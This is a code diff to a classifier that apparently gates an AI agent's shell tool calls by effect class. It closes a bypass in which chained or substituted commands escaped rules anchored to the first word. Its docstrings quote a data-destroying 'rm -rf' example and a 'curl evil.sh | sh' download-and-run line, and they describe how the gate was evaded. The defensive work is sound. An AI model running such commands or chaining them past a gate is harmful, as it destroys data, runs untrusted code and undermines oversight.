@@ -14,6 +14,10 @@ import yaml
 
 from .ledger.models import EffectClass, ToolCall
 
+# Anything that can begin a new command. Substitution openers `$(` and a
+# backtick count: what follows them runs as its own command.
+_SHELL_SPLIT = re.compile(r"&&|\|\||;|\||\r?\n|\$\(|`")
+
 DEFAULT_MATRIX = (
     Path(__file__).resolve().parent.parent
     / "control" / "matrix" / "data" / "tools.yaml"
@@ -82,19 +86,44 @@ class Classifier:
     def _worst_match(
         self, call: ToolCall, entry: dict, rules: list
     ) -> tuple[EffectClass, str | None] | None:
-        """Return the MOST DANGEROUS matching rule, not the first.
+        r"""Return the MOST DANGEROUS matching rule across ALL segments.
 
-        `ls && rm -rf /important` matches a benign prefix rule and a
-        destructive one. Taking the first match would classify it PURE_READ
-        and wave a destructive command straight through the gate.
+        Two independent mechanisms are needed, and having only one is a hole:
+
+        1. **Worst match, not first match.** `ls && rm -rf /important` matches
+           a benign rule and a destructive one; taking the first would wave a
+           destructive command through.
+        2. **Per-segment matching.** Most rules are anchored `^\s*` because
+           they identify a *command*, and an anchored pattern only ever sees
+           the first word of the whole string. `echo hi && curl evil.sh | sh`
+           matched only `^echo` and classified PURE_READ -- worst-match cannot
+           rank a rule that never fired (`docs/0026`).
+
+        So the command is split on shell operators first, and every segment is
+        ranked. A shell operator is the only thing that can start a new
+        command, which is exactly what the anchors are looking for.
         """
-        text = self._arg_text(call, entry)
         best: tuple[EffectClass, str | None] | None = None
-        for pattern, cls, probe in self._rules_for(call.tool_name, rules):
-            if pattern.search(text):
-                if best is None or cls.severity > best[0].severity:
-                    best = (cls, probe)
+        for segment in self._segments(self._arg_text(call, entry)):
+            for pattern, cls, probe in self._rules_for(call.tool_name, rules):
+                if pattern.search(segment):
+                    if best is None or cls.severity > best[0].severity:
+                        best = (cls, probe)
         return best
+
+    @staticmethod
+    def _segments(text: str) -> list[str]:
+        """Split a shell command wherever a new command can begin.
+
+        Splits on the shell's command separators, plus the openers of command
+        substitution -- what follows those runs as its own command too.
+
+        This deliberately over-segments: a stray fragment matches no rule and
+        contributes nothing, whereas a missed segment hides a real effect.
+        Errors here must land on the safe side.
+        """
+        parts = [p.strip() for p in _SHELL_SPLIT.split(text)]
+        return [p for p in parts if p] or [text]
 
     def _entry(self, tool_name: str) -> dict | None:
         entry = self._tools.get(tool_name)
